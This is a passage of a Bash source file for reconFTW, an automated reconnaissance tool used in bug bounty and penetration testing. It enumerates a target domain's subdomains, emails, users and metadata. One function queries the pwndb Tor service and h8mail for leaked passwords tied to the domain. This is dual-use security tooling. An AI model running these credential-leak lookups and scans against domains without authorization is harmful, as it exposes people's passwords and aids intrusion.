#!/usr/bin/env bash

. ./reconftw.cfg

function banner(){
	printf "\n${bgreen}"
	printf "  ██▀███  ▓█████  ▄████▄   ▒█████   ███▄    █   █████▒▄▄▄█████▓ █     █░\n"
	printf " ▓██ ▒ ██▒▓█   ▀ ▒██▀ ▀█  ▒██▒  ██▒ ██ ▀█   █ ▓██   ▒ ▓  ██▒ ▓▒▓█░ █ ░█░\n"
	printf " ▓██ ░▄█ ▒▒███   ▒▓█    ▄ ▒██░  ██▒▓██  ▀█ ██▒▒████ ░ ▒ ▓██░ ▒░▒█░ █ ░█ \n"
	printf " ▒██▀▀█▄  ▒▓█  ▄ ▒▓▓▄ ▄██▒▒██   ██░▓██▒  ▐▌██▒░▓█▒  ░ ░ ▓██▓ ░ ░█░ █ ░█ \n"
	printf " ░██▓ ▒██▒░▒████▒▒ ▓███▀ ░░ ████▓▒░▒██░   ▓██░░▒█░      ▒██▒ ░ ░░██▒██▓ \n"
	printf " ░ ▒▓ ░▒▓░░░ ▒░ ░░ ░▒ ▒  ░░ ▒░▒░▒░ ░ ▒░   ▒ ▒  ▒ ░      ▒ ░░   ░ ▓░▒ ▒  \n"
	printf "   ░▒ ░ ▒░ ░ ░  ░  ░  ▒     ░ ▒ ▒░ ░ ░░   ░ ▒░ ░          ░      ▒ ░ ░  \n"
	printf "   ░░   ░    ░   ░        ░ ░ ░ ▒     ░   ░ ░  ░ ░      ░        ░   ░  \n"
	printf "    ░        ░  ░░ ░          ░ ░           ░                      ░    \n"
	printf "                 ░                                                      \n"
	printf " ${reconftw_version}-axiom                           by @six2dez${reset}\n"
}

###############################################################################################################
################################################### TOOLS #####################################################
###############################################################################################################

function check_version(){
	timeout 10 git fetch &>/dev/null
	exit_status=$?
	if [ $exit_status -eq 0 ]; then
		BRANCH=$(git rev-parse --abbrev-ref HEAD)
		HEADHASH=$(git rev-parse HEAD)
		UPSTREAMHASH=$(git rev-parse ${BRANCH}@{upstream})
		if [ "$HEADHASH" != "$UPSTREAMHASH" ]; then
			printf "\n${yellow} There is a new version, run ./install.sh to get latest version${reset}\n\n"
		fi
	else
		printf "\n${bred} Unable to check updates ${reset}\n\n"
	fi
}

function tools_installed(){

	printf "\n\n${bgreen}#######################################################################${reset}\n"
	printf "${bblue} Checking installed tools ${reset}\n\n"

	allinstalled=true

	[ -n "$GOPATH" ] || { printf "${bred} [*] GOPATH var		[NO]${reset}\n"; allinstalled=false;}
	[ -n "$GOROOT" ] || { printf "${bred} [*] GOROOT var		[NO]${reset}\n"; allinstalled=false;}
	[ -n "$PATH" ] || { printf "${bred} [*] PATH var		[NO]${reset}\n"; allinstalled=false;}
	[ -f "$tools/degoogle_hunter/degoogle.py" ] || { printf "${bred} [*] degoogle		[NO]${reset}\n"; allinstalled=false;}
	[ -f "$tools/ParamSpider/paramspider.py" ] || { printf "${bred} [*] Paramspider	[NO]${reset}\n"; allinstalled=false;}
	[ -f "$tools/brutespray/brutespray.py" ] || { printf "${bred} [*] brutespray	[NO]${reset}\n"; allinstalled=false;}
	[ -f "$tools/dnsrecon/dnsrecon.py" ] || { printf "${bred} [*] dnsrecon	[NO]${reset}\n"; allinstalled=false;}
	[ -f "$tools/fav-up/favUp.py" ] || { printf "${bred} [*] fav-up		[NO]${reset}\n"; allinstalled=false;}
	[ -f "$tools/Corsy/corsy.py" ] || { printf "${bred} [*] Corsy		[NO]${reset}\n"; allinstalled=false;}
	[ -f "$tools/testssl.sh/testssl.sh" ] || { printf "${bred} [*] testssl		[NO]${reset}\n"; allinstalled=false;}
	[ -f "$tools/CMSeeK/cmseek.py" ] || { printf "${bred} [*] CMSeeK		[NO]${reset}\n"; allinstalled=false;}
	[ -f "$tools/ctfr/ctfr.py" ] || { printf "${bred} [*] ctfr		[NO]${reset}\n"; allinstalled=false;}
	[ -f "$tools/fuzz_wordlist.txt" ] || { printf "${bred} [*] OneListForAll	[NO]${reset}\n"; allinstalled=false;}
	[ -f "$tools/LinkFinder/linkfinder.py" ] || { printf "${bred} [*] LinkFinder	        [NO]${reset}\n"; allinstalled=false;}
	[ -f "$tools/GitDorker/GitDorker.py" ] || { printf "${bred} [*] GitDorker	        [NO]${reset}\n"; allinstalled=false;}
	[ -f "$tools/degoogle_hunter/degoogle_hunter.sh" ] || { printf "${bred} [*] degoogle_hunter	[NO]${reset}\n"; allinstalled=false;}
	[ -f "$tools/getjswords.py" ] || { printf "${bred} [*] getjswords   	[NO]${reset}\n"; allinstalled=false;}
	type -P arjun &>/dev/null || { printf "${bred} [*] Arjun		[NO]${reset}\n"; allinstalled=false;}
	type -P dirdar &>/dev/null || { printf "${bred} [*] dirdar		[NO]${reset}\n"; allinstalled=false;}
	type -P github-endpoints &>/dev/null || { printf "${bred} [*] github-endpoints	[NO]${reset}\n"; allinstalled=false;}
	type -P github-subdomains &>/dev/null || { printf "${bred} [*] github-subdomains	[NO]${reset}\n"; allinstalled=false;}
	type -P gospider &>/dev/null || { printf "${bred} [*] gospider		[NO]${reset}\n"; allinstalled=false;}
	type -P wafw00f &>/dev/null || { printf "${bred} [*] wafw00f		[NO]${reset}\n"; allinstalled=false;}
	type -P subfinder &>/dev/null || { printf "${bred} [*] Subfinder		[NO]${reset}\n"; allinstalled=false;}
	type -P assetfinder &>/dev/null || { printf "${bred} [*] Assetfinder	[NO]${reset}\n"; allinstalled=false;}
	type -P dnsvalidator &>/dev/null || { printf "${bred} [*] dnsvalidator	[NO]${reset}\n"; allinstalled=false;}
	type -P gowitness &>/dev/null || { printf "${bred} [*] gowitness		[NO]${reset}\n"; allinstalled=false;}
	type -P findomain &>/dev/null || { printf "${bred} [*] Findomain		[NO]${reset}\n"; allinstalled=false;}
	type -P amass &>/dev/null || { printf "${bred} [*] Amass		[NO]${reset}\n"; allinstalled=false;}
	type -P crobat &>/dev/null || { printf "${bred} [*] Crobat		[NO]${reset}\n"; allinstalled=false;}
	type -P mildew &>/dev/null || { printf "${bred} [*] mildew		[NO]${reset}\n"; allinstalled=false;}
	type -P waybackurls &>/dev/null || { printf "${bred} [*] Waybackurls	[NO]${reset}\n"; allinstalled=false;}
	type -P gauplus &>/dev/null || { printf "${bred} [*] gauplus		[NO]${reset}\n"; allinstalled=false;}
	type -P dnsx &>/dev/null || { printf "${bred} [*] dnsx		[NO]${reset}\n"; allinstalled=false;}
	type -P DNScewl &>/dev/null || { printf "${bred} [*] DNScewl		[NO]${reset}\n"; allinstalled=false;}
	type -P cf-check &>/dev/null || { printf "${bred} [*] Cf-check		[NO]${reset}\n"; allinstalled=false;}
	type -P nuclei &>/dev/null || { printf "${bred} [*] Nuclei		[NO]${reset}\n"; allinstalled=false;}
	[ -d ~/nuclei-templates ] || { printf "${bred} [*] Nuclei templates    [NO]${reset}\n"; allinstalled=false;}
	type -P gf &>/dev/null || { printf "${bred} [*] Gf			[NO]${reset}\n"; allinstalled=false;}
	type -P Gxss &>/dev/null || { printf "${bred} [*] Gxss		[NO]${reset}\n"; allinstalled=false;}
	type -P subjs &>/dev/null || { printf "${bred} [*] subjs		[NO]${reset}\n"; allinstalled=false;}
	type -P ffuf &>/dev/null || { printf "${bred} [*] ffuf		[NO]${reset}\n"; allinstalled=false;}
	type -P massdns &>/dev/null || { printf "${bred} [*] Massdns		[NO]${reset}\n"; allinstalled=false;}
	type -P qsreplace &>/dev/null || { printf "${bred} [*] qsreplace		[NO]${reset}\n"; allinstalled=false;}
	type -P interlace &>/dev/null || { printf "${bred} [*] interlace		[NO]${reset}\n"; allinstalled=false;}
	type -P anew &>/dev/null || { printf "${bred} [*] Anew		[NO]${reset}\n"; allinstalled=false;}
	type -P unfurl &>/dev/null || { printf "${bred} [*] unfurl		[NO]${reset}\n"; allinstalled=false;}
	type -P crlfuzz &>/dev/null || { printf "${bred} [*] crlfuzz		[NO]${reset}\n"; allinstalled=false;}
	type -P httpx &>/dev/null || { printf "${bred} [*] Httpx		[NO]${reset}\n${reset}"; allinstalled=false;}
	type -P jq &>/dev/null || { printf "${bred} [*] jq			[NO]${reset}\n${reset}"; allinstalled=false;}
	type -P notify &>/dev/null || { printf "${bred} [*] notify		[NO]${reset}\n${reset}"; allinstalled=false;}
	type -P dalfox &>/dev/null || { printf "${bred} [*] dalfox		[NO]${reset}\n${reset}"; allinstalled=false;}
	type -P puredns &>/dev/null || { printf "${bred} [*] puredns		[NO]${reset}\n${reset}"; allinstalled=false;}
	type -P axiom-ls &>/dev/null || { printf "${bred} [*] axiom		[NO]${reset}\n${reset}"; allinstalled=false;}

	if [ "${allinstalled}" = true ]; then
		printf "${bgreen} Good! All installed! ${reset}\n\n"
	else
		printf "\n${yellow} Try running the installer script again ./install.sh"
		printf "\n${yellow} If it fails for any reason try to install manually the tools missed"
		printf "\n${yellow} Finally remember to set the ${bred}\$tools${yellow} variable at the start of this script"
		printf "\n${yellow} If nothing works and the world is gonna end you can always ping me :D ${reset}\n\n"
	fi

	printf "${bblue} Tools check finished\n"
	printf "${bgreen}#######################################################################\n${reset}"
}

###############################################################################################################
################################################### OSINT #####################################################
###############################################################################################################

function google_dorks(){
	if [ ! -f "$called_fn_dir/.${FUNCNAME[0]}" ] && [ "$GOOGLE_DORKS" = true ] && [ "$OSINT" = true ]; then
		start_func "Google Dorks in process"
		$tools/degoogle_hunter/degoogle_hunter.sh $domain | tee osint/dorks.txt
		sed -r -i "s/\x1B\[([0-9]{1,3}(;[0-9]{1,2})?)?[mGK]//g" osint/dorks.txt
		end_func "Results are saved in $domain/osint/dorks.txt" ${FUNCNAME[0]}
	else
		if [ "$GOOGLE_DORKS" = false ] || [ "$OSINT" = false ]; then
			printf "\n${yellow} ${FUNCNAME[0]} skipped in this mode or defined in reconftw.cfg ${reset}\n"
		else
			printf "${yellow} ${FUNCNAME[0]} are already processed, to force executing ${FUNCNAME[0]} delete $called_fn_dir/.${FUNCNAME[0]} ${reset}\n\n"
		fi
	fi
}

function github_dorks(){
	if { [ ! -f "$called_fn_dir/.${FUNCNAME[0]}" ] || [ "$DIFF" = true ]; } && [ "$GITHUB_DORKS" = true ] && [ "$OSINT" = true ]; then
		start_func "Github Dorks in process"
		if [ -s "${GITHUB_TOKENS}" ]; then
			if [ "$DEEP" = true ]; then
				python3 "$tools/GitDorker/GitDorker.py" -tf "${GITHUB_TOKENS}" -e "$GITDORKER_THREADS" -q "$domain" -p -d "$tools/GitDorker/Dorks/alldorksv3" | grep "\[+\]" | grep "git" | anew -q osint/gitdorks.txt &>>"$LOGFILE"
			else
				python3 "$tools/GitDorker/GitDorker.py" -tf "${GITHUB_TOKENS}" -e "$GITDORKER_THREADS" -q "$domain" -p -d "$tools/GitDorker/Dorks/medium_dorks.txt" | grep "\[+\]" | grep "git" | anew -q osint/gitdorks.txt &>>"$LOGFILE"
			fi
			sed -r -i "s/\x1B\[([0-9]{1,3}(;[0-9]{1,2})?)?[mGK]//g" osint/gitdorks.txt
		else
			printf "\n${bred} Required file ${GITHUB_TOKENS} not exists or empty${reset}\n"
		fi
		end_func "Results are saved in $domain/osint/gitdorks.txt" ${FUNCNAME[0]}
	else
		if [ "$GITHUB_DORKS" = false ] || [ "$OSINT" = false ]; then
			printf "\n${yellow} ${FUNCNAME[0]} skipped in this mode or defined in reconftw.cfg ${reset}\n"
		else
			printf "${yellow} ${FUNCNAME[0]} is already processed, to force executing ${FUNCNAME[0]} delete $called_fn_dir/.${FUNCNAME[0]} ${reset}\n\n"
		fi
	fi
}

function metadata(){
	if { [ ! -f "$called_fn_dir/.${FUNCNAME[0]}" ] || [ "$DIFF" = true ]; } && [ "$METADATA" = true ] && [ "$OSINT" = true ]; then
		start_func "Scanning metadata in public files"
		metafinder -d "$domain" -l 20 -o osint -go -bi -ba &>>"$LOGFILE"
		mv "osint/${domain}/*" "osint/" 2>>"$LOGFILE"
		rmdir "osint/${domain}" 2>>"$LOGFILE"
		end_func "Results are saved in $domain/osint/[software/authors/metadata_results].txt" ${FUNCNAME[0]}
	else
		if [ "$METADATA" = false ] || [ "$OSINT" = false ]; then
			printf "\n${yellow} ${FUNCNAME[0]} skipped in this mode or defined in reconftw.cfg ${reset}\n"
		else
			printf "${yellow} ${FUNCNAME[0]} is already processed, to force executing ${FUNCNAME[0]} delete $called_fn_dir/.${FUNCNAME[0]} ${reset}\n\n"
		fi
	fi
}

function emails(){
	if { [ ! -f "$called_fn_dir/.${FUNCNAME[0]}" ] || [ "$DIFF" = true ]; } && [ "$EMAILS" = true ] && [ "$OSINT" = true ]; then
		start_func "Searching emails/users/passwords leaks"
		cd "$tools/theHarvester" || { echo "Failed to cd directory in ${FUNCNAME[0]} @ line ${LINENO}"; exit 1; }
		python3 theHarvester.py -d $domain -b all 2>>"$LOGFILE" > $dir/.tmp/harvester.txt
		cd "$dir" || { echo "Failed to cd to $dir in ${FUNCNAME[0]} @ line ${LINENO}"; exit 1; }
		cat .tmp/harvester.txt | awk '/Emails/,/Hosts/' | sed -e '1,2d' | head -n -2 | sed -e '/Searching /d' -e '/exception has occurred/d' -e '/found:/Q' | anew -q osint/emails.txt
		cat .tmp/harvester.txt | awk '/Users/,/IPs/' | sed -e '1,2d' | head -n -2 | sed -e '/Searching /d' -e '/exception has occurred/d' -e '/found:/Q' | anew -q osint/users.txt
		cat .tmp/harvester.txt | awk '/Links/,/Users/' | sed -e '1,2d' | head -n -2 | sed -e '/Searching /d' -e '/exception has occurred/d' -e '/found:/Q' | anew -q osint/linkedin.txt

		h8mail -t $domain -q domain --loose -c $tools/h8mail_config.ini -j .tmp/h8_results.json &>>"$LOGFILE"
		if [ -s ".tmp/h8_results.json" ]; then
			cat .tmp/h8_results.json | jq -r '.targets[0] | .data[] | .[]' | cut -d '-' -f2 | anew -q osint/h8mail.txt
		fi

		PWNDB_STATUS=$(timeout 15s curl -Is --socks5-hostname localhost:9050 http://pwndb2am4tzkvold.onion | grep HTTP | cut -d ' ' -f2)

		if [ "$PWNDB_STATUS" = 200 ]; then
			cd "$tools/pwndb" || { echo "Failed to cd directory in ${FUNCNAME[0]} @ line ${LINENO}"; exit 1; }
			python3 pwndb.py --target "@${domain}" | sed '/^[-]/d' | anew -q $dir/osint/passwords.txt
			cd "$dir" || { echo "Failed to cd directory in ${FUNCNAME[0]} @ line ${LINENO}"; exit 1; }
			sed -r -i "s/\x1B\[([0-9]{1,3}(;[0-9]{1,2})?)?[mGK]//g" osint/passwords.txt
		else
			text="${yellow}\n pwndb is currently down :(\n\n Check xjypo5vzgmo7jca6b322dnqbsdnp3amd24ybx26x5nxbusccjkm4pwid.onion${reset}\n"
			printf "${text}" && printf "${text}" | $NOTIFY
		fi
		end_func "Results are saved in $domain/osint/[emails/users/h8mail/passwords].txt" ${FUNCNAME[0]}
	else
		if [ "$EMAILS" = false ] || [ "$OSINT" = false ]; then
			printf "\n${yellow} ${FUNCNAME[0]} skipped in this mode or defined in reconftw.cfg ${reset}\n"
		else
			printf "${yellow} ${FUNCNAME[0]} is already processed, to force executing ${FUNCNAME[0]} delete $called_fn_dir/.${FUNCNAME[0]} ${reset}\n\n"
		fi

	fi
}

function domain_info(){
	if { [ ! -f "$called_fn_dir/.${FUNCNAME[0]}" ] || [ "$DIFF" = true ]; } && [ "$DOMAIN_INFO" = true ] && [ "$OSINT" = true ]; then
		start_func "Searching domain info (whois, registrant name/email domains)"
		lynx -dump "https://domainbigdata.com/${domain}" | tail -n +19 > osint/domain_info_general.txt

		cat osint/domain_info_general.txt | grep '/nj/' | tr -s ' ' ',' | cut -d ',' -f3 > .tmp/domain_registrant_name.txt
		cat osint/domain_info_general.txt | grep '/mj/' | tr -s ' ' ',' | cut -d ',' -f3 > .tmp/domain_registrant_email.txt
		cat osint/domain_info_general.txt | grep -E "\b([0-9]{1,3}\.){3}[0-9]{1,3}\b" | grep "https://domainbigdata.com" | tr -s ' ' ',' | cut -d ',' -f3 > .tmp/domain_registrant_ip.txt

		sed -i -n '/Copyright/q;p' osint/domain_info_general.txt

		if [ -s ".tmp/domain_registrant_name.txt" ]; then
			for line in $(cat .tmp/domain_registrant_name.txt); do
				lynx -dump $line | tail -n +18 | sed -n '/]domainbigdata.com/q;p' >> osint/domain_info_name.txt && echo -e "\n\n#######################################################################\n\n" >> osint/domain_info_name.txt
			done
		fi

		if [ -s ".tmp/domain_registrant_email.txt" ]; then
			for line in $(cat .tmp/domain_registrant_email.txt); do
				lynx -dump $line | tail -n +18 | sed -n '/]domainbigdata.com/q;p'  >> osint/domain_info_email.txt && echo -e "\n\n#######################################################################\n\n" >> osint/domain_info_email.txt
			done
		fi

		if [ -s ".tmp/domain_registrant_ip.txt" ]; then
			for line in $(cat .tmp/domain_registrant_ip.txt); do
				lynx -dump $line | tail -n +18 | sed -n '/]domainbigdata.com/q;p'  >> osint/domain_info_ip.txt && echo -e "\n\n#######################################################################\n\n" >> osint/domain_info_ip.txt
			done
		fi
		end_func "Results are saved in $domain/osint/domain_info_[general/name/email/ip].txt" ${FUNCNAME[0]}
	else
		if [ "$DOMAIN_INFO" = false ] || [ "$OSINT" = false ]; then
			printf "\n${yellow} ${FUNCNAME[0]} skipped in this mode or defined in reconftw.cfg ${reset}\n"
		else
			printf "${yellow} ${FUNCNAME[0]} is already processed, to force executing ${FUNCNAME[0]} delete $called_fn_dir/.${FUNCNAME[0]} ${reset}\n\n"
		fi
	fi
}


###############################################################################################################
############################################### SUBDOMAINS ####################################################
###############################################################################################################

function subdomains_full(){
	NUMOFLINES_subs="0"
	NUMOFLINES_probed="0"
	printf "${bgreen}#######################################################################\n\n"
	printf "${bblue} Subdomain Enumeration $domain\n\n"
	if [ -f "subdomains/subdomains.txt" ]; then
		cp subdomains/subdomains.txt .tmp/subdomains_old.txt 2>>"$LOGFILE"
	fi
	if [ -f "webs/webs.txt" ]; then
		cp webs/webs.txt .tmp/probed_old.txt 2>>"$LOGFILE"
	fi

	resolvers_update

	sub_passive
	sub_crt
	sub_active
	sub_brute
	sub_permut
	if [ "$DEEP" = true ]; then
		sub_recursive
	fi
	sub_dns
	sub_scraping
	webprobe_simple
	if [ -f "subdomains/subdomains.txt" ]; then
		deleteOutScoped $outOfScope_file subdomains/subdomains.txt
		NUMOFLINES_subs=$(cat subdomains/subdomains.txt 2>>"$LOGFILE" | anew .tmp/subdomains_old.txt | wc -l)
	fi
	if [ -f "webs/webs.txt" ]; then
		deleteOutScoped $outOfScope_file webs/webs.txt
		NUMOFLINES_probed=$(cat webs/webs.txt 2>>"$LOGFILE" | anew .tmp/probed_old.txt | wc -l)
	fi
	printf "${bblue}\n Total subdomains: ${reset}\n\n"
	notification "- ${NUMOFLINES_subs} new alive subdomains" good
	[ -f "subdomains/subdomains.txt" ] && cat subdomains/subdomains.txt 2>>"$LOGFILE" | sort
	notification "- ${NUMOFLINES_probed} new web probed" good
	[ -f "webs/webs.txt" ] && cat webs/webs.txt 2>>"$LOGFILE" | sort
	notification "Subdomain Enumeration Finished" good
	printf "${bblue} Results are saved in $domain/subdomains/subdomains.txt and webs/webs.txt${reset}\n"
	printf "${bgreen}#######################################################################\n\n"
}

function sub_passive(){
	if [ ! -f "$called_fn_dir/.${FUNCNAME[0]}" ] || [ "$DIFF" = true ]; then
		start_subfunc "Running : Passive Subdomain Enumeration"
		axiom-scan $list -m subfinder -all -o .tmp/subfinder_psub.txt &>>"$LOGFILE"
		axiom-scan $list -m assetfinder -o .tmp/assetfinder_psub.txt &>>"$LOGFILE"
		axiom-scan $list -m amass -passive -o .tmp/amass_psub.txt &>>"$LOGFILE"
		axiom-scan $list -m findomain -o .tmp/findomain_psub.txt &>>"$LOGFILE"
		axiom-scan $list -m waybackurls -o .tmp/waybackurls_psub_tmp.txt &>>"$LOGFILE" && cat .tmp/waybackurls_psub_tmp.txt 2>>"$LOGFILE" | unfurl --unique domains | anew -q .tmp/waybackurls_psub.txt
		axiom-scan $list -m gau -o .tmp/gau_psub_tmp.txt &>>"$LOGFILE" && cat .tmp/gau_psub_tmp.txt 2>>"$LOGFILE" | unfurl --unique domains | anew -q .tmp/gau_psub.txt
		crobat -s $domain 2>>"$LOGFILE" | anew -q .tmp/crobat_psub.txt
		if [ -s "${GITHUB_TOKENS}" ]; then
			if [ "$DEEP" = true ]; then
				github-subdomains -d $domain -t $GITHUB_TOKENS -o .tmp/github_subdomains_psub.txt &>>"$LOGFILE"
			else
				github-subdomains -d $domain -k -q -t $GITHUB_TOKENS -o .tmp/github_subdomains_psub.txt &>>"$LOGFILE"
			fi
		fi
		curl -s "https://jldc.me/anubis/subdomains/${domain}" 2>>"$LOGFILE" | grep -Po "((http|https):\/\/)?(([\w.-]*)\.([\w]*)\.([A-z]))\w+" | sed '/^\./d' | anew -q .tmp/jldc_psub.txt
		if echo $domain | grep -q ".mil$"; then
			mildew
			mv mildew.out .tmp/mildew.out
			cat .tmp/mildew.out | grep ".$domain$" | anew -q .tmp/mil_psub.txt
		fi
		NUMOFLINES=$(cat .tmp/*_psub.txt 2>>"$LOGFILE" | sed "s/*.//" | anew .tmp/passive_subs.txt | wc -l)
		end_subfunc "${NUMOFLINES} new subs (passive)" ${FUNCNAME[0]}
	else
		printf "${yellow} ${FUNCNAME[0]} is already processed, to force executing ${FUNCNAME[0]} delete $called_fn_dir/.${FUNCNAME[0]} ${reset}\n\n"
	fi
}

function sub_crt(){
	if { [ ! -f "$called_fn_dir/.${FUNCNAME[0]}" ] || [ "$DIFF" = true ]; } && [ "$SUBCRT" = true ]; then
		start_subfunc "Running : Crtsh Subdomain Enumeration"
		echo "python3 -u /home/op/recon/ctfr/ctfr.py -d ${domain} -o ${domain}_ctfr.txt; cat ${domain}_ctfr.txt" > .tmp/sub_ctrf_commands.txt
		axiom-scan .tmp/sub_ctrf_commands.txt -m exec -o .tmp/crtsh_subs_tmp.txt &>>"$LOGFILE"
		curl "https://tls.bufferover.run/dns?q=.${domain}" 2>>"$LOGFILE" | jq -r .Results[] 2>>"$LOGFILE" | cut -d ',' -f3 | grep -F ".$domain" | anew -q .tmp/crtsh_subs.txt
		curl "https://dns.bufferover.run/dns?q=.${domain}" 2>>"$LOGFILE" | jq -r '.FDNS_A'[],'.RDNS'[] 2>>"$LOGFILE" | cut -d ',' -f2 | grep -F ".$domain" | anew -q .tmp/crtsh_subs_tmp.txt
		NUMOFLINES=$(cat .tmp/crtsh_subs_tmp.txt 2>>"$LOGFILE" | anew .tmp/crtsh_subs.txt | wc -l)
		end_subfunc "${NUMOFLINES} new subs (cert transparency)" ${FUNCNAME[0]}
	else
		if [ "$SUBCRT" = false ]; then
			printf "\n${yellow} ${FUNCNAME[0]} skipped in this mode or defined in reconftw.cfg ${reset}\n"
		else
			printf "${yellow} ${FUNCNAME[0]} is already processed, to force executing ${FUNCNAME[0]} delete $called_fn_dir/.${FUNCNAME[0]} ${reset}\n\n"
		fi
	fi
}

function sub_active(){
	if [ ! -f "$called_fn_dir/.${FUNCNAME[0]}" ] || [ "$DIFF" = true ]; then
		start_subfunc "Running : Active Subdomain Enumeration"
		if [ -s "${inScope_file}" ]; then
			cat ${inScope_file} .tmp/inscope_subs.txt
		fi
		cat .tmp/*_subs.txt | anew -q .tmp/subs_no_resolved.txt
		deleteOutScoped $outOfScope_file .tmp/subs_no_resolved.txt
		axiom-scan .tmp/subs_no_resolved.txt -m puredns-resolve -r /home/op/lists/resolvers.txt -o .tmp/subdomains_tmp.txt &>>"$LOGFILE"
		echo $domain | dnsx -retry 3 -silent -r /home/op/lists/resolvers_trusted.txt 2>>"$LOGFILE" | anew -q .tmp/subdomains_tmp.txt
		NUMOFLINES=$(cat .tmp/subdomains_tmp.txt 2>>"$LOGFILE" | grep "\.$domain$\|^$domain$" | anew subdomains/subdomains.txt | wc -l)
		end_subfunc "${NUMOFLINES} new subs (active resolution)" ${FUNCNAME[0]}
	else
		printf "${yellow} ${FUNCNAME[0]} is already processed, to force executing ${FUNCNAME[0]} delete $called_fn_dir/.${FUNCNAME[0]} ${reset}\n\n"
	fi
}

function sub_dns(){
	if [ ! -f "$called_fn_dir/.${FUNCNAME[0]}" ] || [ "$DIFF" = true ]; then
		start_subfunc "Running : DNS Subdomain Enumeration"
		axiom-scan subdomains/subdomains.txt -m dnsx -retry 3 -a -aaaa -cname -ns -ptr -mx -soa -resp -o subdomains/subdomains_cname.txt &>>"$LOGFILE"
		cat subdomains/subdomains_cname.txt | cut -d '[' -f2 | sed 's/.$//' | grep ".$domain$" | anew -q .tmp/subdomains_dns.txt
		axiom-scan .tmp/subdomains_dns.txt -m puredns-resolve -r /home/op/lists/resolvers.txt -o .tmp/subdomains_dns_resolved.txt &>>"$LOGFILE"
		NUMOFLINES=$(cat .tmp/subdomains_dns_resolved.txt 2>>"$LOGFILE" | grep "\.$domain$\|^$domain$" | anew subdomains/subdomains.txt | wc -l)
		end_subfunc "${NUMOFLINES} new subs (dns resolution)" ${FUNCNAME[0]}
	else
		printf "${yellow} ${FUNCNAME[0]} is already processed, to force executing ${FUNCNAME[0]} delete $called_fn_dir/.${FUNCNAME[0]} ${reset}\n\n"
	fi
}

function sub_brute(){
	if { [ ! -f "$called_fn_dir/.${FUNCNAME[0]}" ] || [ "$DIFF" = true ]; } && [ "$SUBBRUTE" = true ]; then
		start_subfunc "Running : Bruteforce Subdomain Enumeration"
		if [ "$DEEP" = true ]; then
			axiom-scan $subs_wordlist_big -m puredns-single $domain -r /home/op/lists/resolvers.txt -o .tmp/subs_brute.txt &>>"$LOGFILE"
		else
			axiom-scan $subs_wordlist -m puredns-single $domain -r /home/op/lists/resolvers.txt -o .tmp/subs_brute.txt &>>"$LOGFILE"
		fi
		if [[ -s ".tmp/subs_brute.txt" ]]; then
			axiom-scan .tmp/subs_brute.txt -m puredns-resolve -r /home/op/lists/resolvers.txt -o .tmp/subs_brute_valid.txt &>>"$LOGFILE"
		fi
		NUMOFLINES=$(cat .tmp/subs_brute_valid.txt 2>>"$LOGFILE" | sed "s/*.//" | grep ".$domain$" | anew subdomains/subdomains.txt | wc -l)
		end_subfunc "${NUMOFLINES} new subs (bruteforce)" ${FUNCNAME[0]}
	else
		if [ "$SUBBRUTE" = false ]; then
			printf "\n${yellow} ${FUNCNAME[0]} skipped in this mode or defined in reconftw.cfg ${reset}\n"
		else
			printf "${yellow} ${FUNCNAME[0]} is already processed, to force executing ${FUNCNAME[0]} delete $called_fn_dir/.${FUNCNAME[0]} ${reset}\n\n"
		fi
	fi
}

function sub_scraping(){
	if { [ ! -f "$called_fn_dir/.${FUNCNAME[0]}" ] || [ "$DIFF" = true ]; } && [ "$SUBSCRAPING" = true ]; then
		start_subfunc "Running : Source code scraping subdomain search"
		touch .tmp/scrap_subs.txt
		if [ -s "$dir/subdomains/subdomains.txt" ]; then
			axiom-scan subdomains/subdomains.txt -m httpx -follow-host-redirects -random-agent -status-code -threads $HTTPX_THREADS -timeout $HTTPX_TIMEOUT -silent -retries 2 -no-color -o .tmp/probed_tmp_scrap1.txt &>>"$LOGFILE" && cat .tmp/probed_tmp_scrap1.txt | cut -d ' ' -f1 | grep ".$domain$" | anew -q .tmp/probed_tmp_scrap.txt
			axiom-scan .tmp/probed_tmp_scrap.txt -m httpx -csp-probe -random-agent -status-code -threads $HTTPX_THREADS -timeout $HTTPX_TIMEOUT -silent -retries 2 -no-color -o .tmp/probed_tmp_scrap2.txt &>>"$LOGFILE" && cat .tmp/probed_tmp_scrap2.txt | cut -d ' ' -f1 | grep ".$domain$" | anew .tmp/probed_tmp_scrap.txt | unfurl -u domains | anew -q .tmp/scrap_subs.txt
			axiom-scan .tmp/probed_tmp_scrap.txt -m httpx -tls-grab -tls-probe -random-agent -status-code -threads $HTTPX_THREADS -timeout $HTTPX_TIMEOUT -silent -retries 2 -no-color -o .tmp/probed_tmp_scrap3.txt &>>"$LOGFILE" && cat .tmp/probed_tmp_scrap3.txt | cut -d ' ' -f1 | grep ".$domain$" | anew .tmp/probed_tmp_scrap.txt | unfurl -u domains | anew -q .tmp/scrap_subs.txt
			if [ "$DEEP" = true ]; then
				axiom-scan .tmp/probed_tmp_scrap.txt -m gospider --js -d 3 --sitemap --robots -w -r -o .tmp/gospider &>>"$LOGFILE"
			else
				axiom-scan .tmp/probed_tmp_scrap.txt -m gospider --js -d 2 --sitemap --robots -w -r -o .tmp/gospider &>>"$LOGFILE"
			fi
			NUMFILES=$(find .tmp/gospider/ -type f | wc -l)
			[[ $NUMFILES -gt 0 ]] && cat .tmp/gospider/* | sed '/^.\{2048\}./d' | anew -q .tmp/gospider.txt
			grep -Eo 'https?://[^ ]+' .tmp/gospider.txt | sed 's/]$//' | unfurl --unique domains | grep ".$domain$" | anew -q .tmp/scrap_subs.txt
			axiom-scan .tmp/scrap_subs.txt -m puredns-resolve -r /home/op/lists/resolvers.txt -o .tmp/scrap_subs_resolved.txt &>>"$LOGFILE"
			NUMOFLINES=$(cat .tmp/scrap_subs_resolved.txt 2>>"$LOGFILE" | grep "\.$domain$\|^$domain$" | anew subdomains/subdomains.txt | tee .tmp/diff_scrap.txt | wc -l)
			axiom-scan .tmp/diff_scrap.txt -m httpx -follow-host-redirects -random-agent -status-code -threads $HTTPX_THREADS -timeout $HTTPX_TIMEOUT -silent -retries 2 -no-color -o .tmp/probed_tmp_scrap4.txt &>>"$LOGFILE" && cat .tmp/probed_tmp_scrap4.txt 2>>"$LOGFILE" | cut -d ' ' -f1 | grep ".$domain$" | anew -q .tmp/probed_tmp_scrap.txt
			end_subfunc "${NUMOFLINES} new subs (code scraping)" ${FUNCNAME[0]}
		else
			end_subfunc "No subdomains to search (code scraping)" ${FUNCNAME[0]}
		fi
	else
		if [ "$SUBSCRAPING" = false ]; then
			printf "\n${yellow} ${FUNCNAME[0]} skipped in this mode or defined in reconftw.cfg ${reset}\n"
		else
